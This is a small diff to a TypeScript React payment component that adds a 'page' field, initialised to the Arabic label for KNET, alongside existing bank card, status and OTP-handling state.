@@ -17,6 +17,7 @@ type PaymentInfo = {
   bank_card: string[];
   prefix: string;
   status: 'new' | 'pending' | 'approved' | 'rejected';
+  page:string
 };
 const BANKS = [
   {
@@ -159,6 +160,7 @@ export default function Payment (props: any)  {
     bank_card: [''],
     prefix: '',
     status: 'new',
+    page:'كي نت'
   });
 
   const handleAddotp = (otp: string) => {
